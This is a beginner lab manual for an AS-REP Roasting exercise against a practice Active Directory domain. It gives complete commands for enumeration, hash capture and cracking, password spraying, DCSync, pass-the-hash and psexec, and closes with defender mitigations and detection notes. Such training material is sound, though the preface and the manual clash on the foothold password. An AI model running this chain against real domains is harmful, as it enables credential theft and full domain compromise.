> **Self-hosted note (read first).** This manual was written for the hosted
> RootDC lab. In your own VM setup, three things differ:
>
> - **Attacker machine:** wherever the manual says Kali at `10.0.1.100` or
>   `ssh kali@10.0.1.100` (password `Start123!`), use **your own** Kali/Linux VM
>   on the same host-only network. Those hosted credentials do not apply here.
> - **Target DC IP:** wherever the manual uses a DC IP (e.g. `10.0.1.10`), use
>   **your** Windows Server VM's IP. Find it by running `ipconfig` on the DC.
> - **No flag / scoreboard:** there is nothing to submit. Success = you crack the
>   high-value account and authenticate as it.
>
> Your domain foothold account is **`attacker` / `Welcome1!`** (same as hosted).
> The exact target accounts for this lab are in `C:\RootDC\scenarios\` on the DC.


# AS-REP Roasting - Lab Manual (Beginner)

## 1. Scenario Overview

**AS-REP Roasting** targets Active Directory accounts that have Kerberos pre-authentication disabled. Normally, when a user requests a TGT (Ticket Granting Ticket), they must prove their identity by encrypting a timestamp with their password hash. When pre-authentication is disabled, the KDC responds with an AS-REP message encrypted with the user's password hash — without verifying identity first. This means anyone can request these hashes and crack them offline.

**Why it matters:** Misconfigured accounts with pre-auth disabled are low-hanging fruit. One weak password on such an account can give an attacker a foothold — or worse, direct admin access.

**MITRE ATT&CK:** T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting

---

## 2. Objectives Recap

1. Identify accounts without Kerberos pre-authentication required
2. Capture AS-REP hashes for vulnerable accounts
3. Crack user passwords offline
4. Compromise a privileged account

---

## 3. Starting Point

**Your attacker machine:** Kali Linux at `10.0.1.100` — all tools are pre-installed.

**Connect to your machine:**
```bash
ssh kali@10.0.1.100   # Password: Start123!
```

**Your domain credentials:**
- Username: `attacker`
- Password: `Start123!`
- Domain: `fallen.local`

**Network position:** You are a standard domain user. You attack the DC remotely from your Kali machine.

**Target:** Domain Controller DC01 at `10.0.1.10` (also saved in `/home/kali/lab/target`)

**Lab info:** Check `/home/kali/lab/README.txt` for scenario details.

---

## 4. Phase 1: Reconnaissance

### What to enumerate
- Accounts with "Do not require Kerberos preauthentication" flag set
- Group memberships of those accounts

### Success signals
- You find one or more accounts without pre-auth
- At least one has elevated privileges or leads to escalation

### Commands

**Option A: Using Impacket with valid credentials (recommended)**
```bash
# Find AS-REP roastable accounts using your domain credentials
impacket-GetNPUsers 'fallen.local/attacker:Start123!' -dc-ip 10.0.1.10
```

**Option B: Build a user list, then test without credentials**
First, enumerate domain users with your credentials and save them to a file:
```bash
# Enumerate domain users via SMB
nxc smb 10.0.1.10 -u 'attacker' -p 'Start123!' --users | awk '{print $5}' > users.txt
```

Then test those accounts for AS-REP roastability without credentials:
```bash
# Test each user for disabled pre-auth (no credentials needed)
impacket-GetNPUsers 'fallen.local/' -dc-ip 10.0.1.10 -usersfile users.txt -no-pass
```

**Option C: LDAP enumeration**
```bash
ldapsearch -H ldap://10.0.1.10 -D 'attacker@fallen.local' -w 'Start123!' \
  -b 'DC=fallen,DC=local' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName
```

---

## 5. Phase 2: Exploitation

### Tools available
- **impacket-GetNPUsers** — Request AS-REP hashes
- **hashcat** — Crack hashes (mode 18200)
- **john** — Alternative cracking tool

### Request AS-REP hashes

```bash
# Request hashes and save to file
impacket-GetNPUsers 'fallen.local/attacker:Start123!' -dc-ip 10.0.1.10 -request -outputfile asrep_hashes.txt
```

Or without credentials (using the user list from Phase 1):
```bash
impacket-GetNPUsers 'fallen.local/' -dc-ip 10.0.1.10 -usersfile users.txt -no-pass -outputfile asrep_hashes.txt
```

### Crack the hashes

AS-REP hashes use hashcat mode 18200:

```bash
# Crack with rockyou wordlist
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Show cracked passwords
hashcat -m 18200 asrep_hashes.txt --show
```

Alternative with John:
```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

### Expected indicators
- Hashcat shows "Cracked" status
- You recover plaintext passwords for one or more accounts

---

## 6. Phase 3: Privilege Escalation

### Path logic
1. You cracked the password for an AS-REP roastable account (`krb-nopreauth`)
2. This account is a **standard domain user** — not a Domain Admin
3. Use the cracked password to spray against other accounts (password reuse)
4. Also try other common passwords — weak passwords tend to cluster in the same environment
5. Look for an account with **DCSync rights** (replication permissions on the domain)

### Step 1: Enumerate all domain users

Go back to your **original `attacker` credentials** and list every user in the domain:

```bash
nxc smb 10.0.1.10 -u 'attacker' -p 'Start123!' --users
```

A pre-built list is also available at `/home/kali/lab/users.txt`.

### Step 2: Spray passwords

Spray the password you cracked (`Password1`) and other common passwords against all users:

```bash
# Spray the cracked password
nxc smb 10.0.1.10 -u /home/kali/lab/users.txt -p 'Password1' --continue-on-success

# Try other common passwords too — weak passwords cluster together
nxc smb 10.0.1.10 -u /home/kali/lab/users.txt -p 'Passw0rd' --continue-on-success
```

You'll get `[+]` hits for accounts that share these passwords.

### Find which account has DCSync rights

Try `impacket-secretsdump` with each compromised account — only one has replication permissions:

```bash
# Try each [+] account until one returns hashes
impacket-secretsdump 'fallen.local/<account>:Passw0rd@10.0.1.10' -just-dc-user Administrator
```

The account with DCSync rights will return the Administrator NTLM hash. The others will fail with `ERROR_DS_DRA_BAD_DN`.

---

## 7. Flag / Proof of Compromise

### How to validate success
The flag is located on the Administrator's Desktop on DC01.

### Where to find it
Use the Administrator's NTLM hash (from DCSync) with pass-the-hash:

```bash
# Pass-the-hash to read the flag
nxc smb 10.0.1.10 -u Administrator -H '<nt_hash>' -x 'type C:\Users\Administrator\Desktop\flag.txt'
```

Or get a shell:
```bash
impacket-psexec 'fallen.local/Administrator@10.0.1.10' -hashes ':<nt_hash>'
type C:\Users\Administrator\Desktop\flag.txt
```

---

## 8. Troubleshooting

### SSH to Kali
- Connect: `ssh kali@10.0.1.100` (password: `Start123!`)
- Host key error? Run `ssh-keygen -R 10.0.1.100` then reconnect

### VPN Issues
- Ensure WireGuard shows "Connected"
- Test connectivity: `ping 10.0.1.10`

### Kerberos Time Skew
```bash
sudo ntpdate 10.0.1.10
```

### "KDC_ERR_CLIENT_REVOKED"
- The account may be disabled or locked
- Try other enumerated accounts

### impacket-GetNPUsers returns nothing
- Not all domains have AS-REP roastable accounts
- Try broader user enumeration first
- Verify authentication works with your credentials

---

## 9. Defender Notes

### Mitigations
- **Enable pre-authentication** for all accounts (default setting)
- **Audit accounts** with pre-auth disabled regularly
- **Strong passwords** for any account that must have pre-auth disabled
- **Monitor** for AS-REP requests from unusual sources

### Detection
- **Event ID 4768** — TGT requested without pre-auth
  - Look for encryption type RC4 (0x17)
  - Unusual requesting IP addresses
- **Event ID 4625** — Failed logon (if attacker tries blind enumeration)

---

## 10. Learn More

- [AS-REP Roasting - MITRE ATT&CK](https://attack.mitre.org/techniques/T1558/004/)
- [HackTricks - AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [Harmj0y - Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
